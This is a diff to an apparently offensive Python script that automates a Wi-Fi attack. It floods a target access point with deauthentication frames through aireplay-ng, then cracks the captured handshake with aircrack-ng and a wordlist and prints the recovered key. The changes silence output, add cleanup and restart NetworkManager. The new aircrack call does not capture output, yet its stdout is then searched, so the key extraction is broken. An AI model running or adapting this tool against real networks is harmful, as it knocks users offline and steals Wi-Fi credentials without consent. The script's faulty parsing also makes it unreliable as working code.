@@ -137,17 +137,20 @@ time.sleep(5)  # Let airodump collect initial data
 
 print("Launching de-authentication attack for 1 minute...")
 deauth_process = subprocess.Popen(
-    ["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic]
+    ["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
 )
 
-# Show a countdown timer for the de-auth attack
-for remaining in range(60, 0, -1):
-    print(f"De-authentication in progress... {remaining} seconds remaining", end="\r")
-    time.sleep(1)
-
-deauth_process.terminate()
-deauth_process.wait()
-print("\nDe-authentication attack stopped.")
+# Display a timer while de-authentication is running
+try:
+    for remaining in range(60, 0, -1):
+        print(f"De-authentication in progress... {remaining} seconds remaining", end="\r")
+        time.sleep(1)
+finally:
+    deauth_process.terminate()
+    deauth_process.wait()
+    print("\nDe-authentication attack stopped.")
 
 airodump_process.terminate()
 airodump_process.wait()
@@ -155,6 +158,7 @@ airodump_process.wait()
 if attack_choice == "1":
     print("De-authentication attack completed. Exiting program.")
     subprocess.run(["sudo", "airmon-ng", "stop", hacknic])
+    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
     exit()
 
 print("Proceeding to crack the Wi-Fi password...")
@@ -171,15 +175,10 @@ if not cap_files:
 cap_file = cap_files[0]  # Select the first .cap file
 
 aircrack_command = ["sudo", "aircrack-ng", "-w", wordlist_path, cap_file]
-with subprocess.Popen(aircrack_command, stdout=subprocess.PIPE, text=True) as aircrack_proc:
-    for line in aircrack_proc.stdout:
-        print(line, end="")
+aircrack_result = subprocess.run(aircrack_command, capture_output=False, text=True)
 
 # Extract and display password if found
-with open(cap_file, "r") as cap_content:
-    aircrack_result = cap_content.read()
-
-password_match = re.search(r"KEY FOUND! \[ (.+) \]", aircrack_result)
+password_match = re.search(r"KEY FOUND! \[ (.+) \]", aircrack_result.stdout)
 if password_match:
     cracked_password = password_match.group(1)
     print("\033[92m" + "="*40)
@@ -191,6 +190,9 @@ else:
 # Revert to managed mode
 print("Restoring Wi-Fi adapter to managed mode...")
 subprocess.run(["sudo", "airmon-ng", "stop", hacknic])
+
+# Restart NetworkManager
+subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
 
 # Verify the mode change
 iwconfig_result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
